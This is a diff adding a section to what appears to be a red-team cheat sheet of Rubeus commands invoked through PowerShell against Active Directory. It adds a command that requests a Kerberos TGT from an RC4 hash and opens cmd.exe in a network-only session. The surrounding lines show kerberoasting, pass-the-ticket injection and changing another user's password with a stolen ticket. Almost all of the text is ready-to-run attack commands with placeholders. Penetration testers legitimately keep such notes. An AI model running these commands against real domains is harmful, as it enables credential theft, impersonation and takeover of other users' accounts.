@@ -42,6 +42,11 @@ Invoke-Rubeus 'kerberoast /stats /creduser:<domain>.local\<user> /credpassword:<
 Invoke-Rubeus 'asktgt /user:<user> /rc4:<hash> /domain:<domain> /ptt'
 ```
 
+## Request a TGT ticket and create a network only session
+```powershell
+Invoke-Rubeus 'asktgt /user:<user> /rc4:<hash> /domain:<domain.local> /dc:<dc>.<domain.local> /ptt /nowrap /createnetonly:"C:\Windows\System32\cmd.exe" /show'
+```
+
 ## Change password for another user using kerberos ticket
 ```powershell
 Invoke-Rubeus 'asktgt /user:<user_can_change_passwords> /changepw /rc4:<hash> /domain:<domain> /outfile:<user_can_change_passwords>.ticket'
